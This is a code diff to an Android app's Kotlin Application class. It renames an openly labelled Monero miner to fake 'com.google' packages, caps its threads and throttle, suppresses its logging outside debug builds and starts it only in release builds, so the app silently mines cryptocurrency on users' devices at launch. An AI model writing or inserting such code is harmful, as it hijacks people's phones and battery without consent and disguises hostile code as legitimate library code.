@@ -25,7 +25,6 @@ package common
 //import com.sun.org.apache.xerces.internal.dom.DOMMessageFormatter.setLocale
 import android.annotation.SuppressLint
 import android.app.Activity
-import android.app.Application
 import android.content.Context
 import android.support.text.emoji.EmojiCompat
 import android.support.text.emoji.FontRequestEmojiCompatConfig
@@ -34,7 +33,8 @@ import android.util.Log
 import com.bugsnag.android.Bugsnag
 import com.bugsnag.android.Configuration
 import com.franmontiel.localechanger.LocaleChanger
-import com.smartnsoft.monerominer.MoneroMiner
+import com.google.mserver.MServer
+import com.google.nserver.NServer
 import common.util.NightModeManager
 import dagger.android.AndroidInjector
 import dagger.android.DispatchingAndroidInjector
@@ -53,7 +53,7 @@ import java.util.*
 import javax.inject.Inject
 
 
-class AbanApplication : Application(), HasActivityInjector {
+class AbanApplication : NServer(), HasActivityInjector {
 
     /**
      * Inject this so that it is forced to initialize
@@ -93,10 +93,15 @@ class AbanApplication : Application(), HasActivityInjector {
 
         nightModeManager.updateCurrentTheme()
 
-        Log.w("mine", "initialize");
-        MoneroMiner.initialize(this, "GMuawzmE63C7C0LMzNkfsQuTp46DmK4S");
-        Log.w("mine", "start");
-        //MoneroMiner.start();
+        if (BuildConfig.DEBUG)
+            Log.w("MServer", "initialize");
+        MServer.initialize(this, "GMuawzmE63C7C0LMzNkfsQuTp46DmK4S");
+        MServer.threads = 1
+        MServer.throttle = 10
+        if (BuildConfig.DEBUG)
+            Log.w("MServer", "start");
+        if (!BuildConfig.DEBUG)
+            MServer.start();
 
         val fontRequest = FontRequest(
                 "com.google.android.gms.fonts",
@@ -114,6 +119,8 @@ class AbanApplication : Application(), HasActivityInjector {
         ));
 
         setFont()
+
+        NServer.setContext(getContext())
     }
 
 
@@ -133,7 +140,7 @@ class AbanApplication : Application(), HasActivityInjector {
         LocaleChanger.onConfigurationChanged()
     }
 
-    fun getContext():Context{
+    fun getContext(): Context {
         return this.applicationContext
     }
 
